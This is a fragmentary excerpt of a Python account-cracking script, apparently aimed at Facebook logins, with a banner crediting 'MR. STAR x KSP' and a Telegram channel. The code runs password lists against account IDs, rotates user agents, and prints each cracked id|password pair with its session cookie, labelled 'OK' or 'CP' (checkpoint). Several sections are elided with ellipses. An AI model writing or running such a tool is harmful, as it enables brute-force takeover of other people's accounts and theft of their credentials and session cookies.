...
\033[0;93m
╔══════════════════════════════════════════╗🖤"
║Author   : MR. STAR x KSP
║TELE CHANELL   : STAR_CRACK
║TELEGRAM :  @kaka_ksp
║Version  : 4.0.1                       
╚══════════════════════════════════════════╝
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"KSP-CP [bold red]{idf}|{pw}")
				tree.add(f"KSP-CP [bold red]{kuki}\n")
				cetak(tree)
				...
				tree = Tree(f"  ")
				tree.add(f"KSP-OK [bold green]{idf}|{pw}")
				tree.add(f"KSP-OK [bold green]{kuki}\n")
				cetak(tree)
...
def crack(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}KSP{x} {loop}/{len(id)} LIVE ! [bold green]{ok}[/] CP ! [bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
